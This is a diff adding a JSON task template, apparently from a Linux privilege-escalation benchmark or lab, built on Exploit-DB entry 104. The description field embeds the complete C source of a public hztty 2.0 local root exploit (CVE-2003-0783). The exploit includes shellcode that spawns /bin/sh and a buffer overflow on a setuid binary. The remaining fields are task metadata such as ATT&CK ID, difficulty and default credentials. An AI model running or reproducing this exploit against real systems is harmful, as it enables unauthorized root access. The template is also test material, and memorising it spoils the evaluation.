@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_104",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: hztty 2.0 (RedHat 9.0) - Local Privilege Escalation (OSVDB-7119;CVE-2003-0783)\n\nExploit source code (104.c):\n```\n/*  0x333hztty => hztty 2.0 local root exploit\n *\n *\n *\tmore info : Debian Security Advisory DSA 385-1\n *\n *\t*note* I adjusted some part of hztty's code since\n *\tthere were some errors. hope this will not influence\n *\texploitation :> tested against Red Hat 9.0 :\n *\n * [c0wboy@0x333 c0wboy]$ gcc 0x333hztty.c -o k\n * [c0wboy@0x333 c0wboy]$ ./k\n *\n *  ---  local root exploit for hztty 2.0  ---\n *  ---  coded by c0wboy ~ 0x33  ---\n *\n * sh-2.05b# [./hztty started]  [using /dev/ttyp6]\n * sh-2.05b$ sh-2.05b# uid=0(root) gid=0(root) groups=500(c0wboy)\n * sh-2.05b#\n *\n *  coded by c0wboy\n *\n *  (c) 0x333 Outsiders Security Labs\n *\n */\n\n#include <stdio.h>\n#include <unistd.h>\n\n#define BIN    \"./hztty\"\n#define SIZE   272\n\n\nunsigned char shellcode[] =\n\t\"\\x31\\xdb\\x89\\xd8\\xb0\\x17\\xcd\\x80\\x31\\xdb\\x89\\xd8\"\n\t\"\\xb0\\x2e\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\"\n\t\"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\"\n\t\"\\xd2\\xb0\\x0b\\xcd\\x80\" ;\n\nint main()\n{\n\tint i;\n\tchar out[SIZE];\n\tchar *own[] = { shellcode, 0x0 };\n\n\tint *hztty = (int *)(out);\n\tint ret = 0xbffffffa - strlen(BIN) - strlen(shellcode);\n\n\tfor (i=0 ; i<SIZE-1 ; i+=4)\n\t\t*hztty++ = ret;\n\n\thztty = 0x0;\n\n\tfprintf (stdout, \"\\n ---  local root exploit for hztty 2.0  ---\\n\");\n\tfprintf (stdout, \" ---  coded by c0wboy ~ www.0x333.org   ---\\n\\n\");\n\n\texecle (BIN, BIN, \"-I\", out, 0x0, own, 0x0);\n}\n\n\n// milw0rm.com [2003-09-21]\n```",
+  "cve": "OSVDB-7119;CVE-2003-0783",
+  "exploitdb_id": "104",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_104",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
